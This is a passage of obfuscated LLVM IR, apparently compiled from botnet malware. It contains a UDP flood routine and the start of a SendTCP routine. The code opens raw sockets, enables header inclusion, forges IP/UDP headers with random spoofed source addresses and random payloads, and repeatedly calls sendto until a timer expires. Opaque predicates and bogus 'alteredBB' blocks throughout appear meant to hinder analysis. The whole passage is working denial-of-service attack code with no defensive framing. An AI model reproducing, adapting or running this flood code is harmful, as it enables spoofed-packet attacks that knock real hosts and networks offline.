  %60 = getelementptr inbounds [8 x i8], [8 x i8]* %59, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 8, i32 4, i1 false)
  %61 = load i32, i32* %19, align 4
  store i32 %61, i32* %22, align 4
  %62 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %62, i32* %23, align 4
  %63 = load i32, i32* %23, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %66, label %65

; <label>:65:                                     ; preds = %58
  br label %366

; <label>:66:                                     ; preds = %58
  store i32 1, i32* %24, align 4
  %67 = load i32, i32* %23, align 4
  %68 = bitcast i32* %24 to i8*
  %69 = call i32 @setsockopt(i32 %67, i32 0, i32 3, i8* %68, i32 4) #5
  %70 = icmp slt i32 %69, 0
  br i1 %70, label %71, label %88

; <label>:71:                                     ; preds = %66
  %72 = load i32, i32* @x.65
  %73 = load i32, i32* @y.66
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %71
  %80 = load i32, i32* @x.65
  %81 = load i32, i32* @y.66
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %366

; <label>:88:                                     ; preds = %66
  store i32 50, i32* %25, align 4
  br label %89

; <label>:89:                                     ; preds = %109, %88
  %90 = load i32, i32* @x.65
  %91 = load i32, i32* @y.66
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %89
  %98 = load i32, i32* %25, align 4
  %99 = add nsw i32 %98, -1
  store i32 %99, i32* %25, align 4
  %100 = icmp ne i32 %98, 0
  %101 = load i32, i32* @x.65
  %102 = load i32, i32* @y.66
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart216, label %originalBB6alteredBB

originalBBpart216:                                ; preds = %originalBB6
  br i1 %100, label %109, label %116

; <label>:109:                                    ; preds = %originalBBpart216
  %110 = call i64 @time(i64* null) #5
  %111 = call i32 @rand_cmwc()
  %112 = zext i32 %111 to i64
  %113 = xor i64 %110, %112
  %114 = trunc i64 %113 to i32
  call void @srand(i32 %114) #5
  %115 = call i32 @rand() #5
  call void @init_rand(i32 %115)
  br label %89

; <label>:116:                                    ; preds = %originalBBpart216
  %117 = load i32, i32* %20, align 4
  %118 = sub nsw i32 32, %117
  %119 = shl i32 1, %118
  %120 = sub nsw i32 %119, 1
  %121 = xor i32 %120, -1
  store i32 %121, i32* %26, align 4
  %122 = load i32, i32* %18, align 4
  %123 = sext i32 %122 to i64
  %124 = add i64 28, %123
  %125 = call i8* @llvm.stacksave()
  store i8* %125, i8** %27, align 8
  %126 = alloca i8, i64 %124, align 16
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %28, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = getelementptr i8, i8* %129, i64 20
  %131 = bitcast i8* %130 to %struct.udphdr*
  store %struct.udphdr* %131, %struct.udphdr** %29, align 8
  %132 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %134 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %133, i32 0, i32 0
  %135 = load i32, i32* %134, align 4
  %136 = load i32, i32* %26, align 4
  %137 = call i32 @getRandomIP(i32 %136)
  %138 = call i32 @htonl(i32 %137) #10
  %139 = load i32, i32* %18, align 4
  %140 = sext i32 %139 to i64
  %141 = add i64 8, %140
  %142 = trunc i64 %141 to i32
  call void @makeIPPacket(%struct.iphdr* %132, i32 %135, i32 %138, i8 zeroext 17, i32 %142)
  %143 = load i32, i32* %18, align 4
  %144 = sext i32 %143 to i64
  %145 = add i64 8, %144
  %146 = trunc i64 %145 to i16
  %147 = call zeroext i16 @htons(i16 zeroext %146) #10
  %148 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.1* %149 to %struct.anon.2*
  %151 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %150, i32 0, i32 2
  store i16 %147, i16* %151, align 2
  %152 = call i32 @rand_cmwc()
  %153 = trunc i32 %152 to i16
  %154 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %155 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.1* %155 to %struct.anon.2*
  %157 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %156, i32 0, i32 0
  store i16 %153, i16* %157, align 2
  %158 = load i32, i32* %16, align 4
  %159 = icmp eq i32 %158, 0
  br i1 %159, label %160, label %178

; <label>:160:                                    ; preds = %116
  %161 = load i32, i32* @x.65
  %162 = load i32, i32* @y.66
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %160
  %169 = call i32 @rand_cmwc()
  %170 = load i32, i32* @x.65
  %171 = load i32, i32* @y.66
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %183

; <label>:178:                                    ; preds = %116
  %179 = load i32, i32* %16, align 4
  %180 = trunc i32 %179 to i16
  %181 = call zeroext i16 @htons(i16 zeroext %180) #10
  %182 = zext i16 %181 to i32
  br label %183

; <label>:183:                                    ; preds = %178, %originalBBpart220
  %184 = phi i32 [ %169, %originalBBpart220 ], [ %182, %178 ]
  %185 = trunc i32 %184 to i16
  %186 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %187 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %186, i32 0, i32 0
  %188 = bitcast %union.anon.1* %187 to %struct.anon.2*
  %189 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %188, i32 0, i32 1
  store i16 %185, i16* %189, align 2
  %190 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %191 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon.1* %191 to %struct.anon.2*
  %193 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %192, i32 0, i32 3
  store i16 0, i16* %193, align 2
  %194 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %195 = bitcast %struct.udphdr* %194 to i8*
  %196 = getelementptr inbounds i8, i8* %195, i64 8
  %197 = load i32, i32* %18, align 4
  call void @makeRandomStr(i8* %196, i32 %197)
  %198 = bitcast i8* %126 to i16*
  %199 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 2
  %201 = load i16, i16* %200, align 2
  %202 = zext i16 %201 to i32
  %203 = call zeroext i16 @csum(i16* %198, i32 %202)
  %204 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 7
  store i16 %203, i16* %205, align 2
  %206 = call i64 @time(i64* null) #5
  %207 = load i32, i32* %17, align 4
  %208 = sext i32 %207 to i64
  %209 = add nsw i64 %206, %208
  %210 = trunc i64 %209 to i32
  store i32 %210, i32* %30, align 4
  store i32 0, i32* %31, align 4
  br label %211

; <label>:211:                                    ; preds = %originalBBpart250, %344, %183
  %212 = load i32, i32* @x.65
  %213 = load i32, i32* @y.66
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %211
  %220 = load i32, i32* @x.65
  %221 = load i32, i32* @y.66
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %228

; <label>:228:                                    ; preds = %originalBBpart224
  %229 = load i32, i32* @x.65
  %230 = load i32, i32* @y.66
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %228
  %237 = load i32, i32* %23, align 4
  %238 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %239 = call i64 @sendto(i32 %237, i8* %126, i64 %124, i32 0, %struct.sockaddr* %238, i32 16)
  %240 = call i32 @rand_cmwc()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 0
  %244 = bitcast %union.anon.1* %243 to %struct.anon.2*
  %245 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %244, i32 0, i32 0
  store i16 %241, i16* %245, align 2
  %246 = load i32, i32* %16, align 4
  %247 = icmp eq i32 %246, 0
  %248 = load i32, i32* @x.65
  %249 = load i32, i32* @y.66
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %247, label %256, label %258

; <label>:256:                                    ; preds = %originalBBpart228
  %257 = call i32 @rand_cmwc()
  br label %279

; <label>:258:                                    ; preds = %originalBBpart228
  %259 = load i32, i32* @x.65
  %260 = load i32, i32* @y.66
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %258
  %267 = load i32, i32* %16, align 4
  %268 = trunc i32 %267 to i16
  %269 = call zeroext i16 @htons(i16 zeroext %268) #10
  %270 = zext i16 %269 to i32
  %271 = load i32, i32* @x.65
  %272 = load i32, i32* @y.66
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %279

; <label>:279:                                    ; preds = %originalBBpart232, %256
  %280 = phi i32 [ %257, %256 ], [ %270, %originalBBpart232 ]
  %281 = load i32, i32* @x.65
  %282 = load i32, i32* @y.66
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %279
  %289 = trunc i32 %280 to i16
  %290 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %291 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon.1* %291 to %struct.anon.2*
  %293 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %292, i32 0, i32 1
  store i16 %289, i16* %293, align 2
  %294 = call i32 @rand_cmwc()
  %295 = trunc i32 %294 to i16
  %296 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 3
  store i16 %295, i16* %297, align 4
  %298 = load i32, i32* %26, align 4
  %299 = call i32 @getRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #10
  %301 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = bitcast i8* %126 to i16*
  %304 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i32 0, i32 2
  %306 = load i16, i16* %305, align 2
  %307 = zext i16 %306 to i32
  %308 = call zeroext i16 @csum(i16* %303, i32 %307)
  %309 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 7
  store i16 %308, i16* %310, align 2
  %311 = load i32, i32* %31, align 4
  %312 = load i32, i32* %22, align 4
  %313 = icmp eq i32 %311, %312
  %314 = load i32, i32* @x.65
  %315 = load i32, i32* @y.66
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %313, label %322, label %345

; <label>:322:                                    ; preds = %originalBBpart236
  %323 = load i32, i32* @x.65
  %324 = load i32, i32* @y.66
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %322
  %331 = call i64 @time(i64* null) #5
  %332 = load i32, i32* %30, align 4
  %333 = sext i32 %332 to i64
  %334 = icmp sgt i64 %331, %333
  %335 = load i32, i32* @x.65
  %336 = load i32, i32* @y.66
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %334, label %343, label %344

; <label>:343:                                    ; preds = %originalBBpart240
  br label %364

; <label>:344:                                    ; preds = %originalBBpart240
  store i32 0, i32* %31, align 4
  br label %211

; <label>:345:                                    ; preds = %originalBBpart236
  %346 = load i32, i32* @x.65
  %347 = load i32, i32* @y.66
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %345
  %354 = load i32, i32* %31, align 4
  %355 = add i32 %354, 1
  store i32 %355, i32* %31, align 4
  %356 = load i32, i32* @x.65
  %357 = load i32, i32* @y.66
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart250, label %originalBB42alteredBB

originalBBpart250:                                ; preds = %originalBB42
  br label %211

; <label>:364:                                    ; preds = %343
  %365 = load i8*, i8** %27, align 8
  call void @llvm.stackrestore(i8* %365)
  br label %366

; <label>:366:                                    ; preds = %364, %originalBBpart24, %65, %57
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %367 = alloca i8*, align 8
  %368 = alloca i32, align 4
  %369 = alloca i32, align 4
  %370 = alloca i32, align 4
  %371 = alloca i32, align 4
  %372 = alloca i32, align 4
  %373 = alloca %struct.sockaddr_in, align 4
  %374 = alloca i32, align 4
  %375 = alloca i32, align 4
  %376 = alloca i32, align 4
  %377 = alloca i32, align 4
  %378 = alloca i32, align 4
  %379 = alloca i8*, align 8
  %380 = alloca %struct.iphdr*, align 8
  %381 = alloca %struct.udphdr*, align 8
  %382 = alloca i32, align 4
  %383 = alloca i32, align 4
  store i8* %0, i8** %367, align 8
  store i32 %1, i32* %368, align 4
  store i32 %2, i32* %369, align 4
  store i32 %3, i32* %370, align 4
  store i32 %4, i32* %371, align 4
  store i32 %5, i32* %372, align 4
  %384 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %373, i32 0, i32 0
  store i16 2, i16* %384, align 4
  %385 = load i32, i32* %368, align 4
  %386 = icmp eq i32 %385, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %71
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %89
  %387 = load i32, i32* %25, align 4
  %_ = sub i32 0, %387
  %gen = add i32 %_, -1
  %_7 = sub i32 0, %387
  %gen8 = add i32 %_7, -1
  %_9 = sub i32 0, %387
  %gen10 = add i32 %_9, -1
  %_11 = sub i32 0, %387
  %gen12 = add i32 %_11, -1
  %_13 = sub i32 0, %387
  %gen14 = add i32 %_13, -1
  %388 = add nsw i32 %387, -1
  store i32 %388, i32* %25, align 4
  %389 = icmp ne i32 %387, 0
  br label %originalBB6

originalBB18alteredBB:                            ; preds = %originalBB18, %160
  %390 = call i32 @rand_cmwc()
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %211
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %228
  %391 = load i32, i32* %23, align 4
  %392 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %393 = call i64 @sendto(i32 %391, i8* %126, i64 %124, i32 0, %struct.sockaddr* %392, i32 16)
  %394 = call i32 @rand_cmwc()
  %395 = trunc i32 %394 to i16
  %396 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %397 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %396, i32 0, i32 0
  %398 = bitcast %union.anon.1* %397 to %struct.anon.2*
  %399 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %398, i32 0, i32 0
  store i16 %395, i16* %399, align 2
  %400 = load i32, i32* %16, align 4
  %401 = icmp eq i32 %400, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %258
  %402 = load i32, i32* %16, align 4
  %403 = trunc i32 %402 to i16
  %404 = call zeroext i16 @htons(i16 zeroext %403) #10
  %405 = zext i16 %404 to i32
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %279
  %406 = trunc i32 %280 to i16
  %407 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %408 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %407, i32 0, i32 0
  %409 = bitcast %union.anon.1* %408 to %struct.anon.2*
  %410 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %409, i32 0, i32 1
  store i16 %406, i16* %410, align 2
  %411 = call i32 @rand_cmwc()
  %412 = trunc i32 %411 to i16
  %413 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %414 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %413, i32 0, i32 3
  store i16 %412, i16* %414, align 4
  %415 = load i32, i32* %26, align 4
  %416 = call i32 @getRandomIP(i32 %415)
  %417 = call i32 @htonl(i32 %416) #10
  %418 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %419 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %418, i32 0, i32 8
  store i32 %417, i32* %419, align 4
  %420 = bitcast i8* %126 to i16*
  %421 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 2
  %423 = load i16, i16* %422, align 2
  %424 = zext i16 %423 to i32
  %425 = call zeroext i16 @csum(i16* %420, i32 %424)
  %426 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 7
  store i16 %425, i16* %427, align 2
  %428 = load i32, i32* %31, align 4
  %429 = load i32, i32* %22, align 4
  %430 = icmp eq i32 %428, %429
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %322
  %431 = call i64 @time(i64* null) #5
  %432 = load i32, i32* %30, align 4
  %433 = sext i32 %432 to i64
  %434 = icmp sgt i64 %431, %433
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %345
  %435 = load i32, i32* %31, align 4
  %_43 = sub i32 %435, 1
  %gen44 = mul i32 %_43, 1
  %_45 = sub i32 0, %435
  %gen46 = add i32 %_45, 1
  %_47 = sub i32 0, %435
  %gen48 = add i32 %_47, 1
  %436 = add i32 %435, 1
  store i32 %436, i32* %31, align 4
  br label %originalBB42
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %55

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* @x.67
  %36 = load i32, i32* @y.68
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* %9, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #10
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i32, i32* @x.67
  %48 = load i32, i32* @y.68
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %55

; <label>:55:                                     ; preds = %originalBBpart2, %30
  %56 = load i8*, i8** %8, align 8
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %58 = call i32 @getHost(i8* %56, %struct.in_addr* %57)
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %55
  br label %575

; <label>:61:                                     ; preds = %55
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %63 = getelementptr inbounds [8 x i8], [8 x i8]* %62, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 8, i32 4, i1 false)
  %64 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %64, i32* %17, align 4
  %65 = load i32, i32* %17, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %84, label %67

; <label>:67:                                     ; preds = %61
  %68 = load i32, i32* @x.67
  %69 = load i32, i32* @y.68
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = load i32, i32* @x.67
  %77 = load i32, i32* @y.68
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %575

; <label>:84:                                     ; preds = %61
  %85 = load i32, i32* @x.67
  %86 = load i32, i32* @y.68
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %84
  store i32 1, i32* %18, align 4
  %93 = load i32, i32* %17, align 4
  %94 = bitcast i32* %18 to i8*
  %95 = call i32 @setsockopt(i32 %93, i32 0, i32 3, i8* %94, i32 4) #5
  %96 = icmp slt i32 %95, 0
  %97 = load i32, i32* @x.67
  %98 = load i32, i32* @y.68
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %96, label %105, label %106

; <label>:105:                                    ; preds = %originalBBpart28
  br label %575

; <label>:106:                                    ; preds = %originalBBpart28
  %107 = load i32, i32* %14, align 4
  %108 = icmp eq i32 %107, 0
  br i1 %108, label %109, label %110

; <label>:109:                                    ; preds = %106
  store i32 0, i32* %19, align 4
  br label %116

; <label>:110:                                    ; preds = %106
  %111 = load i32, i32* %14, align 4
  %112 = sub nsw i32 32, %111
  %113 = shl i32 1, %112
  %114 = sub nsw i32 %113, 1
  %115 = xor i32 %114, -1
  store i32 %115, i32* %19, align 4
  br label %116

; <label>:116:                                    ; preds = %110, %109
  %117 = load i32, i32* %12, align 4
  %118 = sext i32 %117 to i64
  %119 = add i64 40, %118
  %120 = call i8* @llvm.stacksave()
  store i8* %120, i8** %20, align 8
  %121 = alloca i8, i64 %119, align 16
  %122 = bitcast i8* %121 to %struct.iphdr*
  store %struct.iphdr* %122, %struct.iphdr** %21, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %124 = bitcast %struct.iphdr* %123 to i8*
  %125 = getelementptr i8, i8* %124, i64 20
  %126 = bitcast i8* %125 to %struct.tcphdr*
  store %struct.tcphdr* %126, %struct.tcphdr** %22, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %129 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %128, i32 0, i32 0
  %130 = load i32, i32* %129, align 4
  %131 = load i32, i32* %19, align 4
  %132 = call i32 @getRandomIP(i32 %131)
  %133 = call i32 @htonl(i32 %132) #10
  %134 = load i32, i32* %12, align 4
  %135 = sext i32 %134 to i64
  %136 = add i64 20, %135
  %137 = trunc i64 %136 to i32
  call void @makeIPPacket(%struct.iphdr* %127, i32 %130, i32 %133, i8 zeroext 6, i32 %137)
  %138 = call i32 @rand_cmwc()
  %139 = trunc i32 %138 to i16
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
